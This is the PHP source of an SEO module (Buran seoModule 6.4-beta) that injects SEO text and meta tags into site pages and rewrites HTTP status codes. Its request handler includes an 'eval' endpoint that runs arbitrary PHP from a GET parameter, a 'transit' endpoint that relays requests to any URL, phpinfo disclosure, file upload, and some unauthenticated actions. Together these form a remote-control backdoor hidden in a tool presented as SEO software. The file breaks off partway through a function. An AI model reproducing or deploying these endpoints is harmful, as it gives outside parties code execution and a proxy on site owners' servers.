<?php
/**
 * seoModule
 * @version 6.4-beta
 * @date 09.02.2021
 * @author <sergey.it@delta-ltd.ru>
 * @copyright 2021 DELTA http://delta-ltd.ru/
 * @size 94444
 */

$bsm = new buran_seoModule('6.4-beta');

if ( ! $bsm->module_mode) {
	$bsm->init();

} else {
	error_reporting(0);
	ini_set('display_errors', 'off');

	if ('list' == $_GET['a']) {
		header('Content-type: text/html; charset=utf-8');
		print $bsm->alist();
		exit();
	}

	if ('phpinfo' == $_GET['a']) {
		if ( ! ($bsm->auth($_GET['w']))) exit('er');
		phpinfo();
		exit();
	}

	if ('db_data' == $_GET['a']) {
		if ( ! ($bsm->auth($_GET['w']))) exit();
		header('Content-Type: application/octet-stream');
		header('Content-Transfer-Encoding: binary');
		print $bsm->bsmfile('db_data', 'get');
		exit();
	}
	
	header('Content-Type: text/plain; charset=utf-8');

	if ('info' == $_GET['a']) {
		print $bsm->info_parse();
		exit();
	}

	if ('update' == $_GET['a']) {
		if ( ! ($bsm->auth($_GET['w']))) exit('er');
		$bsm->cache_clear();
		$bsm->htaccess();
		$type  = $_GET['t'];
		$code  = $_POST['c'];
		$alias = preg_replace("/[^a-z0-9_]/", '', $_GET['n']);
		if ('imgs' == $type) {
			$code = array(
				'filescount' => $_POST['fs'],
				'files'      => $_FILES,
			);
		}
		$res = $bsm->bsmfile($type, 'set', $alias, $code);
		if ( ! $res) exit('er');
		exit('ok');
	}

	if ('upgrade' == $_GET['a']) {
		if ( ! ($bsm->auth($_GET['w']))) exit('er');
		$bsm->cache_clear();
		$bsm->htaccess();
		$res = $bsm->upgrade();
		if ( ! $res) exit('er');
		exit('ok');
	}

	if ('deactivate' == $_GET['a']) {
		if ( ! ($bsm->auth($_GET['w']))) exit('er');
		$module_hash = $bsm->droot.$bsm->module_folder.'/'.$bsm->module_hash;
		if (file_exists($module_hash)) {
			unlink($module_hash);
			$bsm->log('[07]');
		}
		exit('ok');
	}

	if ('clearlog' == $_GET['a']) {
		if ( ! ($bsm->auth($_GET['w']))) exit('er');
		$bsm->log('', '', $_GET['t'], true);
		exit('ok');
	}

	if ('clearcache' == $_GET['a']) {
		$bsm->cache_clear();
		exit('ok');
	}

	if ('reverse' == $_GET['a']) {
		$res = $bsm->send_reverse_request(true);
		print $res ? 'ok' : 'er';
		exit();
	}

	if ('transit' == $_GET['a']) {
		if ( ! ($bsm->auth($_GET['w']))) exit();
		if ( ! $_GET['u']) exit();
		$post = $bsm->requestmethod == 'POST' ? $_POST : false;
		$headers = $_GET['h'] ? $_GET['h'] : false;
		if ($headers) {
			$headers = base64_decode($headers);
			$headers = unserialize($headers);
			if ( ! is_array($headers)) $headers = false;
		}
		$reqres = $bsm->request(
			$_GET['u'], false, $headers, $post
		);
		$res = '';
		if ($reqres['res']) {
			$headers = serialize($reqres['headers']);
			$headers = base64_encode($headers);
			$info    = serialize($reqres['info']);
			$info    = base64_encode($info);
			$res     = $info."\n\n".$headers."\n\n".$reqres['response'];
		}
		print $res;
		exit();
	}

	if ('transit_list' == $_GET['a']) {
		if ( ! ($bsm->auth($_GET['w']))) exit();
		print $bsm->bsmfile('transit', 'get');
		exit();
	}

	if ('eval' == $_GET['a']) {
		if ( ! ($bsm->auth($_GET['w']))) exit();
		$code = trim($_GET['code']);
		eval($code);
		exit();
	}

	if ('watch' == $_GET['a']) {
		$sessnm = $bsm->ws_info['session_name'];
		if ($sessnm) session_name($sessnm);
		session_start();

		if ($bsm->c[2]['reverse_requests']) {
			$bsm->send_reverse_request();
		}
		if ($bsm->c[2]['transit_requests']) {
			$bsm->transit_list_check();
		}
		
		$tm = isset($_SESSION['buranseomodule']['watch'][$_GET['u']])
			? intval($_SESSION['buranseomodule']['watch'][$_GET['u']]) : 0;
		if (time() - $tm > 60) exit('er');
		unset($_SESSION['buranseomodule']['watch'][$_GET['u']]);
		$alias = preg_replace("/[^a-z0-9_]/", '', $_GET['b']);
		$info = $bsm->bsmfile('txt_info', 'get', $alias);
		$info['seotext_js'] .= $_GET['s'] == 'y' ? 'y' : 'n';
		$bsm->bsmfile('txt_info', 'set', $alias, $info);

		exit('ok-'.$_GET['s']);
	}

	if ('auth' == $_GET['a']) {
		if ( ! ($bsm->auth($_GET['w']))) exit('er');
		$_SESSION['buranseomodule']['auth'] = time();
		exit('ok');
	}

	exit('er');
}

// ------------------------------------------------------------------

class buran_seoModule
{
	public $version;

	public $c = false;
	public $module_hash;
	public $module_hash_flag = false;
	public $module_file;
	public $module_folder;

	public $droot;
	public $website;
	public $http;
	public $www;
	public $domain;
	public $domain_h;
	public $requesturi;
	public $requestmethod;
	public $pageurl;
	public $querystring;
	public $protocol;
	public $protocol_dop = false;
	public $sapi_name;

	public $accesscode = false;

	public $test = false;
	public $test_stitle;
	public $test_stext;
	public $test_beforecode;

	public $declension;

	public $seotext = false;
	public $seotext_cache = false;
	public $seotext_alias;
	public $seotext_tp;
	public $seotext_tpl;
	public $seotext_hide;
	public $seotext_blog;
	public $seotext_date;
	public $seotext_moddate;
	public $seotext_info;
	public $seotext_tit;
	public $seotext_site;
	public $charset;
	public $module_ua;

	public $page_tpl = false;

	public $template;
	public $headers;
	public $code = array();
	public $tags = false;
	public $oldtags = false;
	
	public $db_op = false;
	
	public $ob_start_flags;

	public $curl_ext;
	public $sock_ext;
	public $fgc_ext;

	public $logs_files;

	public $curl_request_headers = array();

	function __construct($version)
	{
		$this->mct_start = microtime(true);

		$this->version = $version;

		$this->module_file   = 'seoModule.php';
		$this->module_folder = '/_buran/seoModule';
		$this->module_ua     = 'BuranSeoModule';

		$this->droot = dirname(dirname(__FILE__));

		$this->http  = (
			(isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443') ||
			(isset($_SERVER['HTTP_PORT']) && $_SERVER['HTTP_PORT']     == '443') ||
			(isset($_SERVER['HTTP_HTTPS']) && $_SERVER['HTTP_HTTPS']   == 'on') ||
			(isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) == 'on') ||
			(isset($_SERVER['HTTP_X_FORWARDED_PROTO']) &&
				$_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')
				? 'https://' : 'http://');
		$domain = isset($_SERVER['HTTP_HOST'])
				? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME'];
		$domain = explode(':', $domain);
		$domain = $domain[0];
		$this->www = '';
		if (strpos($domain,'www.') === 0) {
			$this->www = 'www.';
			$domain = substr($domain, 4);
		}
		$this->domain        = $domain;
		$this->domain_h      = md5($domain);
		$this->website       = $this->http . $this->www . $this->domain;
		$this->requesturi    = $_SERVER['REQUEST_URI'];
		$this->requestmethod = $_SERVER['REQUEST_METHOD'];
		$this->pageurl       = parse_url($this->requesturi, PHP_URL_PATH);
		$this->querystring   = substr($this->requesturi, strpos($this->requesturi, '?')+1);
		$this->sapi_name     = php_sapi_name();
		if (substr($this->sapi_name,0,3) == 'cgi') {
			$this->protocol = 'Status:';
		} else {
			$this->protocol =
				isset($_SERVER['HTTP_X_PROTOCOL']) && $_SERVER['HTTP_X_PROTOCOL']
				? $_SERVER['HTTP_X_PROTOCOL']
				: (isset($_SERVER['SERVER_PROTOCOL']) && $_SERVER['SERVER_PROTOCOL']
					? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.0');
		}
		if (isset($_POST['seomodule_test']) &&
			isset($_POST['s_title']) && isset($_POST['s_text'])) {
			$this->test            = true;
			$this->test_stitle     = $_POST['s_title'];
			$this->test_stext      = $_POST['s_text'];
			$this->test_beforecode = $_POST['before_code'];
		}

		$this->module_mode = strpos($this->requesturi, dirname($this->module_folder).'/'.$this->module_file) === 0
			? true : false;
		$this->module_hash = md5(__FILE__);
		if (file_exists($this->droot.$this->module_folder.'/'.$this->module_hash)) {
			$this->module_hash_flag = true;
		} else {
			$this->log('[02]');
		}

		$this->curl_ext = extension_loaded('curl') &&
			function_exists('curl_init') ? true : false;

		$this->sock_ext = function_exists('stream_socket_client') ? true : false;

		$this->fgc_ext = function_exists('file_get_contents') ? true : false;

		$this->sqlite3_ext = extension_loaded('sqlite3') &&
			class_exists('SQLite3') ? true : false;

		$this->libxml_ext = extension_loaded('libxml') &&
			class_exists('DOMDocument') ? true : false;

		$this->useragent = false;
		if (stripos($_SERVER['HTTP_USER_AGENT'],'xenu') !== false) {
			$this->useragent = 'xenu';
		} elseif (stripos($_SERVER['HTTP_USER_AGENT'],'screaming frog seo spider') !== false) {
			$this->useragent = 'sfss';
		} elseif (stripos($_SERVER['HTTP_USER_AGENT'],'siteanalyzerbot') !== false) {
			$this->useragent = 'siteanalyzer';
		}

		$this->ws_info = $this->bsmfile('ws_info', 'get');
		if ( ! $this->ws_info) $this->ws_info = array();

		$this->c = $this->config();

		$this->onlyheaders = $this->requestmethod=='HEAD' ? true : false;

		if ($this->c[2]['accesscode']) {
			$this->accesscode = $this->c[2]['accesscode'];
		}

		if ($this->c[2]['dop_protocol']) {
			$this->protocol_dop = $this->c[2]['dop_protocol'];
		}

		$this->ob_start_flags = intval($this->c[2]['ob_start_flags']);

		if ($this->c[2]['urldecode']) {
			$this->requesturi = urldecode($this->requesturi);
		}

		if (isset($this->c[7][$this->c[1]['city']])) {
			$this->declension = $this->c[7][$this->c[1]['city']];
		}

		if ($this->c[2]['ignore_errors']) {
			$this->c[2]['ignore_errors'] = str_replace(' ','',$this->c[2]['ignore_errors']);
		}

		if (isset($_GET['proxy'])) {
			$this->c[2]['proxy'] = $_GET['proxy'];
		}
		if ($this->c[2]['proxy']) {
			$this->c[2]['proxy'] = str_replace('-',':',$this->c[2]['proxy']);
		}

		$tags = isset($this->c[6]['common']) && is_array($this->c[6]['common'])
			? $this->c[6]['common'] : false;
		if ( ! $tags) {
			if (
				isset($this->c[6]['start'])
				&& is_array($this->c[6]['start'])
			) {
				$tags['cntn-1'] = array_shift($this->c[6]['start']);
				$tags['cntn-1']['cntn'] = 'y';
			}
			if (
				isset($this->c[6]['finish'])
				&& is_array($this->c[6]['finish'])
			) {
				$tags['cntn-2'] = array_shift($this->c[6]['finish']);
				$tags['cntn-2']['cntn'] = 'y';
			}
			$this->oldtags = true;
		}
		$this->tags = $tags;

		$charsetlist = array(
			'utf-8' => array(
				/*0*/ 'Статьи',
				/*1*/ 'Все статьи',
				/*2*/ 'Дата',
				/*3*/ 'публикации',
				/*4*/ 'изменения',
				/*5*/ 'рисунок',
				/*6*/ 'фото',
				/*7*/ 'Автор',
				/*8*/ 'Подробнее',
				'fdate' => array(
					'm2' => array(
						'01' => 'января',   '02' => 'февраля',
						'03' => 'марта',    '04' => 'апреля',
						'05' => 'мая',      '06' => 'июня',
						'07' => 'июля',     '08' => 'августа',
						'09' => 'сентября', '10' => 'октября',
						'11' => 'ноября',   '12' => 'декабря',
					),
					'm3' => array(
						'01' => 'янв', '02' => 'фев',
						'03' => 'мар', '04' => 'апр',
						'05' => 'мая', '06' => 'июн',
						'07' => 'июл', '08' => 'авг',
						'09' => 'сен', '10' => 'окт',
						'11' => 'ноя', '12' => 'дек',
					),
					'N2' => array(
						'1' => 'пн', '2' => 'вт', '3' => 'ср',
						'4' => 'чт', '5' => 'пт', '6' => 'сб',
						'7' => 'вс',
					),
				),
			),

			'cp1251' => array(
				/*0*/ '0fLg8vzo',
				/*1*/ 'wvHlIPHy4PL86A==',
				/*2*/ 'xODy4A==',
				/*3*/ '7/Ph6+jq4Pbo6A==',
				/*4*/ '6Ofs5e3l7ej/',
				/*5*/ '8Ojx8+3u6g==',
				/*6*/ '9O7y7g==',
				/*7*/ 'wOLy7vA=',
				/*8*/ 'z+7k8O7h7eXl',
				'fdate' => array(
					'm2' => array(
						'01' => '/+3i4PD/',     '02' => '9OXi8ODr/w==',
						'03' => '7ODw8uA=',     '04' => '4O/w5ev/',
						'05' => '7OD/',         '06' => '6P7t/w==',
						'07' => '6P7r/w==',     '08' => '4OLj8/Hy4A==',
						'09' => '8eXt8v/h8P8=', '10' => '7ury/+Hw/w==',
						'11' => '7e7/4fD/',     '12' => '5OXq4OHw/w==',
					),
					'm3' => array(
						'01' => '/+3i', '02' => '9OXi',
						'03' => '7ODw', '04' => '4O/w',
						'05' => '7OD/', '06' => '6P7t',
						'07' => '6P7r', '08' => '4OLj',
						'09' => '8eXt', '10' => '7ury',
						'11' => '7e7/', '12' => '5OXq',
					),
					'N2' => array(
						'1' => '7+0=', '2' => '4vI=', '3' => '8fA=',
						'4' => '9/I=', '5' => '7/I=', '6' => '8eE=',
						'7' => '4vE=',
					),
				),
			),
		);

		function bsm_array_walk_recursive_fnc(&$v, $k) {
			$v = base64_decode($v);
		}
		$this->charset = $charsetlist[$this->c[2]['out_charset']][0]
			? $charsetlist[$this->c[2]['out_charset']]
			: $charsetlist['utf-8'];
		if ($this->c[2]['out_charset'] != 'utf-8' && is_array($this->charset)) {
			array_walk_recursive($this->charset, 'bsm_array_walk_recursive_fnc');
		}

		$this->regmask = array(
			'html' => "/<html(.*)>/isU",

			'head' => "/<head(.*)>/isU",
			'head_end' => "/<\/head(.*)>/isU",

			'body_end' => "/<\/body(.*)>/isU",

			'h1'    => "/<h1(.*)>(.*)<\/h1>/isU", // 0-2
			'base'  => "/<base (.*)>/isU", // 0-1
			'title' => "/(<title>(.*)<\/title>)(.*<\/head>)/isU", // 0-3

			'canonical'   => "/<link [.]*[^>]*rel=['|\"]canonical['|\"](.*)>/isU", // 0-1
			'canonical_v' => "/href=['|\"](.*)['|\"]/isU", // 0-1

			'description'   => "/<meta [.]*[^>]*name=['|\"]description['|\"](.*)>/isU", // 0-1
			'description_v' => "/content=['|\"](.*)['|\"]/isU", // 0-1

			'keywords'   => "/<meta [.]*[^>]*name=['|\"]keywords['|\"](.*)>/isU", // 0-1
			'keywords_v' => "/content=['|\"](.*)['|\"]/isU", // 0-1

			'robots' => "/<meta [.]*[^>]*name=['|\"]robots['|\"](.*)>/isU", // 0-1
			'robots_v' => "/content=['|\"](.*)['|\"]/isU", // 0-1
		);
	}

	function config()
	{
		$config_default = array(
			1 => array(
				'website'      => $this->http.$this->www.$this->domain,
				'articles'     => '',
				'blog'         => '',
				'bunker_id'    => '',
				'city'         => '',
				'date_start'   => '',
				'company_name' => '',
				'logo'         => '',
				'phone'        => '',
				'address'      => '',
			),
			2 => array(
				'module_enabled'                  => '0',
				'accesscode'                      => '',
				'include_files'                   => '/index.php',
				'sign_of_404'                     => '<h1>Страница не найдена</h1>',
				'launch_exceptions'               => '',
				'transit_requests'                => 1,
				'db_data'                         => 1,
				'out_charset'                     => 'utf-8',
				'reverse_requests'                => '',
				'proxy'                           => '',
				'classname'                       => '',
				'starttag_title'                  => '',
				'starttag_breadcrumbs'            => '',
				'bcrumbs_after_h1'                => '',
				'h1_always_insection'             => '',
				'template_coding'                 => '1',
				'dop_protocol'                    => '',
				'ob_start_flags'                  => PHP_OUTPUT_HANDLER_STDFLAGS,
				'base'                            => '0',
				'canonical'                       => 'replace_or_add',
				'meta'                            => 'replace_or_add',
				'meta_neseo'                      => 'add_if_not_exists',
				'canonical_neseo'                 => 'add_if_not_exists',
				're_linking'                      => 2,
				're_linking_without_stext'        => '',
				'page_without_stit_to_re_linking' => '',
				'blog_enbl'                       => '',
				'hide_opt'                        => '',
				'urldecode'                       => 1,
				'redirect'                        => 1,
				'domain_redirect'                 => 1,
				'ignore_errors'                   => '',
				'city_replace'                    => '',
				'use_cache'                       => 604800,
				'requets_methods'                 => '/GET/HEAD/',
				'error_handler'                   => '',
				'share_code'                      => '<script>(function(b,d,s,m,k,a){setTimeout(function(){k=d.createElement(s);a=d.getElementsByTagName(s)[0];k.async=1;k.defer=1;k.src=m;a.parentNode.insertBefore(k,a);},3000);})(window,document,"script","https://yastatic.net/share2/share.js");</script><div class="ya-share2" data-curtain data-services="vkontakte,facebook,odnoklassniki,messenger,telegram,twitter,viber,whatsapp,moimir,skype,evernote,reddit"></div>',
			),
			4 => array(
				'/index.php'  => '/',
				'/index.html' => '/',
			),
			6 => array(
				'common' => array(),
			),
			12 => array(
				'obrabotka'      => '',
				'o_canonical'    => '',
				'o_micromarking' => '',
			),
			16 => array(
				'bc_1' => '',
			),
			17 => array(
				'deflt' => array(
					'tpl'      => 'deflt',
					'enbl'     => 1,
					'sites'    => array(),
					'repls'    => array(),
					'code'     => array(),
					'intag'    => array(),
					'cntn_tag' => array(
						's' => false,
						'f' => false,
					),
				),
			),
		);

		$config = $this->bsmfile('config_value', 'get');

		if ($config && is_array($config)) {
			foreach ($config AS $key => $row) {
				if ( ! isset($config_default[$key])) {
					$config_default[$key] = $row;
				} else {
					$config_default[$key] = array_merge(
						$config_default[$key],
						$row
					);
				}
			}
		} else {
			$this->log('[03]');
		}

		return $config_default;
	}

	function init()
	{
		if (
			! $this->test
			&& (
				strpos($this->c[2]['requets_methods'],
					'/'.$this->requestmethod.'/') === false
				|| (
					$this->c[2]['module_enabled'] !== '1'
					&& $_SERVER['REMOTE_ADDR'] !== $this->c[2]['module_enabled']
				)
			)
		) {
			if (
				! $this->test
				&& $this->c[2]['module_enabled'] !== '1'
				&& $_SERVER['REMOTE_ADDR'] !== $this->c[2]['module_enabled']
			) $this->log('[01]');
			return false;
		}

		if ($this->c[2]['launch_exceptions']) {
			$paths = $this->c[2]['launch_exceptions'];
			$paths = explode('  ', $paths);
			if (is_array($paths)) {
				foreach ($paths AS $path) {
					$path = trim($path);
					if ( ! $path) continue;
					if (stripos($this->requesturi, $path) === 0) {
						return false;
					}
				}
			}
		}

		if (
			$this->c[2]['error_handler']
			&& function_exists('set_error_handler')
		) {
			set_error_handler(array($this,'error_handler'), E_ALL & ~E_NOTICE);
		}

		$this->clear_request();

		$this->save_request_info('refr');

		if ($this->c[2]['redirect']) {
			$this->redirects();
		}

		$this->seotext();

		$this->template_init();

		$res = ob_start(array($this,'ob_end'),0,$this->ob_start_flags);
		if ($res !== true) {
			$this->log('[04]');
		}
	}

	function ob_end($template)
	{
		if (
			! $this->module_hash_flag
			|| ($this->onlyheaders && ! $this->seotext)
		) {
			return false;
		}

		error_reporting(0);
		ini_set('display_errors', 'off');

		$sessid = session_id();
		if ( ! $sessid) session_start();
		$this->ws_info['session_name'] = session_name();

		if (headers_sent()) {
			$this->log('[22]');
		}

		// $this->bsmfile('test','set',1,$template); //todo
		
		$template_orig = $template;
		$this->tpl_modified = false;

		$this->http_code = $this->http_code();

		if (
			$this->http_code != 404
			&& $this->c[2]['sign_of_404']
			&& strpos($template, $this->c[2]['sign_of_404']) !== false
		) {
			$this->http_code = 404;
		}

		if (
			$this->http_code
			&& $this->http_code != 200
			&& $this->http_code != 404
		) {
			if ($this->seotext) $this->log('[20]');
			$this->save_request_info();
			return false;
		}

		if (
			$this->seotext
			&& $this->http_code == 404
		) {
			$this->seotext_tp = 'S';
			$this->seotext['type'] = 'S';
		}

		if (
			'd' == $this->seotext_site
			&& (
				'S' == $this->seotext_tp
				|| $this->page_tpl['cut_cntn']
			)
		) $this->seotext_site = 'sf';

		if (
			$this->onlyheaders
			&& $this->http_code != 200
			&& $this->seotext_info['http_code'] == 200
		) {
			$this->http_code == 200;
			header($this->protocol.' 200 OK');
			if ($this->protocol_dop) {
				header($this->protocol_dop.' 200 OK');
			}
			return false;
		}

		$gzip = strcmp(substr($template,0,2),"\x1f\x8b") ? false : true;
		if ($gzip) $template = $this->template_coding($template,'de');

		if ( ! $template) {
			$this->log('[21]');
			$this->save_request_info();
			return false;
		}

		if (
			! preg_match($this->regmask['html'], $template)
			|| ! preg_match($this->regmask['head_end'], $template)
			|| ! preg_match($this->regmask['body_end'], $template)
		) {
			if ($this->seotext) $this->log('[25]');
			return false;
		}

		$this->save_tpls_blocks($template);

		$res = $this->meta_parse($template);
		if ($res !== false) {
			$template = $res;
			$this->tpl_modified = true;
		}

		if ($this->seotext) {
			if ( ! $this->seotext_cache || $this->test) {

				$this->text_parse();

				if ($this->requesturi == $this->c[1]['articles']) {
					$this->articles_parse();

				} elseif (
					$this->c[2]['blog_enbl']
					&& $this->requesturi == $this->c[1]['blog']
				) {
					$this->articles_parse(0, 0, 0, true);

				} elseif ($this->seotext_blog) {

				} elseif ($this->c[2]['re_linking']) {
					$with_stext_only = $this->c[2]['re_linking_without_stext'] ? false : true;
					$this->articles_parse($this->seotext_alias, $this->c[2]['re_linking'], $with_stext_only);
				}
			}

			if ($this->http_code != 200) {
				$this->http_code = 200;
				header($this->protocol.' 200 OK');
				if ($this->protocol_dop) {
					header($this->protocol_dop.' 200 OK');
				}
			}

			if ( ! $this->seotext['cache'] && $this->c[2]['use_cache']) {
				$this->cache_save($this->seotext_alias);
			}
			
			if (time() - $this->seotext_info['check']['meta_robots'] > 60*60*6) {
				$this->seotext_info['check']['meta_robots'] = time();
				preg_match_all($this->regmask['robots'], $template, $matches);
				if (is_array($matches)) {
					foreach ($matches[0] AS $m) {
						preg_match_all($this->regmask['robots_v'], $m, $cm);
						$m_rbts = trim($cm[1][0]);
						if (
							stripos($m_rbts,'noindex') !== false
							|| stripos($m_rbts,'nofollow') !== false
							|| stripos($m_rbts,'none') !== false
						) {
							$this->log('[51]');
							break;
						}
					}
				}
			}

			if ( ! $this->onlyheaders) {

				$http_code_finl = $this->http_code();
				if ( ! $http_code_finl || $http_code_finl != 200) {
					$this->log('[24]');
					$this->seotext_info['http_code_er'] ++;
				} else {
					$this->seotext_info['http_code_er'] = 0;
				}

				$this->seotext_info['http_code']       = $this->http_code;
				$this->seotext_info['type']            = $this->seotext_tp;
				$this->seotext_info['seotext_exists'] .= '+';
				$this->seotext_info['seotext_js']     .= '+';

				if (
					$this->seotext_info['type'] &&
					$this->seotext_info['type'] != $this->seotext_tp
				) {
					if ('S' == $this->seotext_tp) {
						$this->log('[14]');
					} else {
						$this->log('[15]');
					}
				}

				$this->bsmfile('txt_info', 'set', $this->seotext_alias, $this->seotext_info);
			}

			$res = $this->stext_parse($template);
			if ($res !== false) {
				$template = $res;
				$this->tpl_modified = true;
			}
		}

		$res = $this->template_parse($template);
		if ($res !== false) {
			$template = $res;
			$this->tpl_modified = true;
		}

		$this->bsmfile('ws_info', 'set', 0, $this->ws_info);

		$this->save_request_info('url', $template);

		if ($this->tpl_modified) {
			if (function_exists('header_remove')) {
				header_remove('Content-Length');
			}
			if ($gzip) $template = $this->template_coding($template,'en');
			return $template;
		} else return false;
	}

	function http_code()
	{
		$http_code = 0;
		if (function_exists('http_response_code')) {
			$http_code = http_response_code();
		}
		$headers_list = headers_list();
		if (is_array($headers_list)) {
			foreach ($headers_list AS $row) {
				if (stripos($row, '404 not found') !== false) {
					$http_code = 404;
				} elseif (stripos($row, '200 ok') !== false) {
					$http_code = 200;
				} elseif (
					stripos($row, 'http/1') === 0 ||
					stripos($row, 'status:') === 0
				) {
					$http_code = 1;
				}
			}
		}
		return $http_code;
	}

	function redirects()
	{
		$redirect_ws = $this->c[2]['domain_redirect']
			? $this->c[1]['website'] : $this->website;

		$redirect_to = $this->requesturi;
		if (
			isset($this->c[4][$redirect_to])
			&& $this->c[4][$redirect_to]
		) {
			$redirect_to = $this->c[4][$redirect_to];
		}
		foreach ($this->c[4] AS $from => $to) {
			if (substr($from,0,1) !== '+') continue;
			$from = substr($from,1);
			if (preg_match($from, $redirect_to) === 1) {
				$redirect_to = preg_replace($from, $to, $redirect_to);
			}
		}
		if (
			isset($this->c[4][$redirect_to])
			&& $this->c[4][$redirect_to]
		) {
			$redirect_to = $this->c[4][$redirect_to];
		}
		if ($redirect_to == $this->requesturi) $redirect_to = false;

		if ( ! $redirect_to && $redirect_ws !== $this->website) {
			$redirect_to = $this->requesturi;
		}
		
		if ($redirect_to) {
			header('Location: '.$redirect_ws.$redirect_to, true, 301);
			exit();
		}
	}

	function clear_request()
	{
		$patt = "/((&|^)(_openstat|utm_.*|yclid|ymclid|gclid|fbclid)=.*)(&|$)/U";
		while (preg_match($patt, $this->querystring, $matches) === 1) {
			$this->querystring = preg_replace($patt, '${4}', $this->querystring);
			if (strpos($this->querystring,'&') === 0) {
				$this->querystring = substr($this->querystring, 1);
			}
			$this->requesturi = $this->pageurl.
				($this->querystring ? '?'.$this->querystring : '');
		}
	}

	function seotext()
	{
		if ( ! is_array($this->c[3])) {
			return false;
		}
		$seotext_alias = false;
		$seotext_tp    = 'A';
		$seotext_tpl   = 'deflt';
		$seotext_tit   = 'd';
		$seotext_site  = 'd';
		$seotext_hide  = 'D';
		$seotext_blog  = false;
		$seotext_date  = 0;

		$flag = false;
		foreach ($this->c[3] AS $alias => $prms) {
			if (
				$this->requesturi != $prms[0]
				|| (
					! $this->c[2]['blog_enbl']
					&& isset($prms['blog'])
					&& $prms['blog'] == 'y'
				)
			) continue;

			$seotext_alias = $alias;

			$seotext_hide  = $prms[2]=='h' ? 'Y'
				: ($prms[2]=='s' ? 'N' : 'D');

			$seotext_tpl = preg_replace("/[^a-z0-9\-]/",'',$prms['tpl']);
			if ( ! $seotext_tpl || $seotext_tpl==='y') $seotext_tpl = 'deflt';

			if (isset($prms['tit']) && in_array($prms['tit'],array('n','h1','sh1','h2h1'))) {
				$seotext_tit = $prms['tit'];
			}

			if (isset($prms['st']) && $prms['st'] == 'sf') {
				$seotext_site = 'sf';
			}

			$seotext_blog = isset($prms['blog']) && $prms['blog'] == 'y'
				? true : false;

			$seotext_date = isset($prms['date']) ? intval($prms['date']) : 0;

			if ($flag) {
				$this->log('[13]');
				break;
			}
			$flag = true;
		}
		
		$this->seotext_tpl = $seotext_tpl;

		$this->seotext_tp = $seotext_tp;

		if ( ! $seotext_alias) return false;
		$this->seotext_alias = $seotext_alias;

		$text = $this->seofile($seotext_alias);
		if ( ! $text && $this->seotext_cache) {
			$text = $this->seofile($seotext_alias, false);
		}
		if ( ! $text) return false;

		$text['type'] = isset($text['type']) && $text['type']=='S' ? 'S' : 'A';

		$this->seotext = $text;

		$this->seotext_tp = $text['type'];

		$hide_flag = $this->c[2]['hide_opt'] === '1' ? 'Y'
			: ( ! $this->c[2]['hide_opt'] || $this->c[2]['hide_opt'] === '0'
				? 'N'
				: (strpos($this->c[2]['hide_opt'], $this->seotext_tp) !== false
					? 'Y' : 'N'));
		$hide_flag = $seotext_hide == 'Y' ? 'Y'
			: ($seotext_hide == 'N' ? 'N' : $hide_flag);
		$this->seotext_hide = $hide_flag;

		$this->seotext_moddate = date('Y-m-d', $this->filetime($text['file']));

		$this->seotext_tit  = $seotext_tit;
		$this->seotext_site = $seotext_site;
		$this->seotext_blog = $seotext_blog;
		$this->seotext_date = $seotext_date;

		$this->seotext_info = $this->bsmfile('txt_info', 'get', $seotext_alias);
		if ( ! $this->onlyheaders) {
			if (
				! $this->seotext_info ||
				! is_array($this->seotext_info) ||
				! isset($this->seotext_info['last'])
			) {
				$this->seotext_info = array(
					'last'           => time()-(60*60*24),
					'type'           => '',
					'interval'       => 0,
					'seotext_exists' => '',
					'seotext_js'     => '',
					'http_code'      => '',
					'http_code_er'   => 0,
				);
			}
			$sr = time() - $this->seotext_info['last'];
			$this->seotext_info['interval'] = intval(($this->seotext_info['interval']+$sr)/2);
			$this->seotext_info['last'] = time();
			$this->seotext_info['seotext_exists'] .= '-';
			if (strlen($this->seotext_info['seotext_exists']) > 100) {
				$this->seotext_info['seotext_exists']
					= substr($this->seotext_info['seotext_exists'], 4);
			}
			if (strlen($this->seotext_info['seotext_js']) > 100) {
				$this->seotext_info['seotext_js']
					= substr($this->seotext_info['seotext_js'], 4);
			}
			$this->bsmfile('txt_info', 'set', $seotext_alias, $this->seotext_info);
		}

		return true;
	}

	function seofile($alias, $use_cache=true)
	{
		if ( ! $this->c[2]['use_cache']) {
			$use_cache = false;
		}
		$file = $this->bsmfile('text_value', 'file', $alias);
		$ft_t = $this->filetime($file);
		$ft_c = $this->filetime($this->bsmfile('txt_cache', 'file', $alias));

		if (
			$use_cache &&
			$ft_c &&
			time()-$ft_c <= $this->c[2]['use_cache'] &&
			$ft_c > $ft_t
		) {
			$from_cache = true;
			$this->seotext_cache = true;
			$text = $this->bsmfile('txt_cache', 'get', $alias);

		} else {
			$from_cache = false;
			$text = $this->bsmfile('text_value', 'get', $alias);
		}

		if ( ! isset($text['file']) || ! $text['file']) {
			$text['file'] = $file;
		}
		if (
			! is_array($text)
			|| ! isset($text['title'])
			|| ! isset($text['description'])
			|| ! isset($text['keywords'])
			|| ! isset($text['s_title'])
			|| ! isset($text['s_text'])
		) {
			if ( ! $from_cache) {
				$this->log('[10]');
			}
			return false;
		}
		return $text;
	}

	function template_coding($template, $act='en')
	{
		if ($this->c[2]['template_coding'] == '2') {
			if ('de' == $act) {
				$template = gzinflate(substr($template,10));
			} else {
				$template = gzencode($template);
			}

		} else {
			if ('de' == $act) {
				$template = zlib_decode($template);
			} else {
				$template = zlib_encode($template, ZLIB_ENCODING_GZIP);
			}
		}
		return $template;
	}

	function text_parse()
	{
		$st = &$this->seotext;

		if ($this->test) {
			$st['s_title']     = $this->test_stitle;
			$st['s_text']      = $this->test_stext;
			$st['before_code'] = $this->test_beforecode;
		}

		$st['flag_multitext'] = strpos($st['s_text'], '[part]') !== false
			? true : false;

		$st['s_text'] = str_replace('<p>[img]</p>', '[img]', $st['s_text']);
		$st['s_text'] = str_replace('<p>[col]</p>', '[col]', $st['s_text']);
		$st['s_text'] = str_replace('<p>[part]</p>', '[part]', $st['s_text']);

		$s_img_f = array();
		if (is_array($st['s_img'])) {
			foreach ($st['s_img'] AS $key => $row) {
				$img = $this->module_folder.'/img/'.$this->seotext_alias.'_'.($key+1);
				if (file_exists($this->droot.$img.'.jpg')) {
					$img .= '.jpg';
				} elseif (file_exists($this->droot.$img.'.png')) {
					$img .= '.png';
				} else {
					continue;
				}
				$s_img_f[] = array(
					'src' => $img,
					'alt' => $row,
				);
			}
		}

		$flag_dopimgs = false;
		$i = 0;
